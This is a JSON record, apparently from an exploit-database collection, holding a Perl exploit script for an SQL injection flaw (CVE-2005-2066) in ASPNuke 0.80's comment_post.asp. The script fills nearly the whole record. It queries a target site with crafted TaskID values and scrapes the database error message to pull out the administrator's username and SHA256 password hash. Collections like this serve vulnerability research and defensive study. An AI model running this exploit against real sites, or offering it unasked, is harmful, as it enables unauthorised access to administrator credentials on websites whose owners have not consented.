{
  "id": "1071",
  "title": "ASPNuke 0.80 - &#039;comment_post.asp&#039; SQL Injection",
  "cve": "CVE-2005-2066",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n#\r\n# SQL Injection Exploit for ASPNuke <= 0.80\r\n# This exploit retrieve the username of the administrator of the board and his password crypted in SHA256\r\n# Related advisory: http://www.securityfocus.com/archive/1/403479/30/0/threaded\r\n# Discovered and Coded by Alberto Trivero\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"\\n\\t===============================\\n\";\r\nprint \"\\t= Exploit for ASPNuke <= 0.80 =\\n\";\r\nprint \"\\t=     by Alberto Trivero      =\\n\";\r\nprint \"\\t===============================\\n\\n\";\r\n\r\nif(@ARGV!=1 or !($ARGV[0]=~m/http/)) {\r\n   print \"Usage:\\nperl $0 [full_target_path]\\n\\nExamples:\\nperl $0 http://www.example.com/aspnuke/\\n\";\r\n   exit(0);\r\n}\r\n\r\n$page=get($ARGV[0].\"module/support/task/comment_post.asp?TaskID=Username\") || die \"[-] Unable to retrieve: $!\";\r\nprint \"[+] Connected to: $ARGV[0]\\n\";\r\n$page=~m/the varchar value '(.*?)' to a column/ && print \"[+] Username of admin is: $1\\n\";\r\nprint \"[-] Unable to retrieve Username\\n\" if(!$1);\r\n$page=get($ARGV[0].\"module/support/task/comment_post.asp?TaskID=Password\") || die \"[-] Unable to retrieve: $!\";\r\n$page=~m/the varchar value '(.*?)' to a column/ && print \"[+] SHA256 hash of password is: $1\\n\";\r\nprint \"[-] Unable to retrieve hash of password\\n\" if(!$1);\r\n\r\n# milw0rm.com [2005-06-27]",
  "url": "https://www.exploit-db.com/exploits/1071"
}